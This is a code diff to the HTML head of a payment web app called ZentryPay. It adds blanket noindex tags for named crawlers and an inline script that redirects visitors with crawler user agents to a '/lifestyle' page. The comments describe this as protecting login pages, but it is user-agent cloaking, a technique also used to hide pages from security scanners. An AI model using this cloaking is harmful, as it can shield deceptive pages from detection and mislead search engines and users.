@@ -4,7 +4,41 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>ZentryPay</title>
-    <script type="module" crossorigin src="/assets/index-DIClspcn.js"></script>
+
+    <!-- STRICT: Block ALL bots from indexing login pages -->
+    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, notranslate, nostore" />
+    <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noimageindex" />
+    <meta name="bingbot" content="noindex, nofollow, noarchive, nosnippet" />
+    <meta name="slurp" content="noindex, nofollow, noarchive, nosnippet" />
+    <meta name="duckduckbot" content="noindex, nofollow" />
+    <meta name="baiduspider" content="noindex, nofollow" />
+    <meta name="yandexbot" content="noindex, nofollow" />
+    <meta name="facebookexternalhit" content="noindex, nofollow" />
+    <meta name="twitterbot" content="noindex, nofollow" />
+    <meta name="linkedinbot" content="noindex, nofollow" />
+    <meta name="pinterestbot" content="noindex, nofollow" />
+    <meta name="applebot" content="noindex, nofollow" />
+
+    <!-- Additional bot blocking -->
+    <meta name="referrer" content="no-referrer" />
+    <meta name="format-detection" content="telephone=no, email=no" />
+
+    <!-- Immediate bot redirect script -->
+    <script>
+      // STRICT: Immediate bot detection before page renders
+      (function() {
+        var ua = navigator.userAgent.toLowerCase();
+        var botPatterns = ['googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot', 'facebookexternalhit', 'twitterbot', 'linkedinbot', 'bot', 'crawl', 'spider', 'scrape'];
+
+        for (var i = 0; i < botPatterns.length; i++) {
+          if (ua.indexOf(botPatterns[i]) !== -1) {
+            window.location.replace('/lifestyle');
+            return;
+          }
+        }
+      })();
+    </script>
+    <script type="module" crossorigin src="/assets/index-zmRfYkg3.js"></script>
     <link rel="stylesheet" crossorigin href="/assets/index-BuzhxTPt.css">
   </head>
 
